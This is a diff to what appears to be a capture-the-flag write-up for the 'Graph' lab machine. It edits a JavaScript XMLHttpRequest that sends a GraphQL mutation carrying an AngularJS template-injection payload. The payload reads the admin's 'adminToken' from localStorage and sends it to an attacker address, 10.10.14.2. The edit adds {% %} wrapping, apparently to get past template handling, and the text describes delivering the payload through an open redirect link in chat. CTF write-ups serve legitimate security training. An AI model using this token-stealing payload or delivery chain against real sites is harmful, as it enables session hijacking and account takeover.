@@ -193,7 +193,7 @@ var request = new XMLHttpRequest();
 request.open('POST','http://internal-api.graph.htb/graphql', false);
 request.setRequestHeader("Content-Type", "text/plain");
 request.withCredentials = true;
-request.send(JSON.stringify({operationName: 'update',variables: {firstname: "{{$on.constructor('new Image().src=\"http://10.10.14.2/?a=\" + window.localStorage.getItem(\"adminToken\");')()}}",lastname: 'null',id: '62abe72aa6d27a07b20d9653',newusername: 'Sally'},query: 'mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}'}));
+request.send(JSON.stringify({operationName: 'update',variables: {firstname: "{%{{$on.constructor('new Image().src=\"http://10.10.14.2/?a=\" + window.localStorage.getItem(\"adminToken\");')()}}%}",lastname: 'null',id: '62abe72aa6d27a07b20d9653',newusername: 'Sally'},query: 'mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}'}));
 ```
 
 The above is what we need the admin to execute in his browser. Now we can send all this using the open redirect vulnerability and sending the link in the chat.
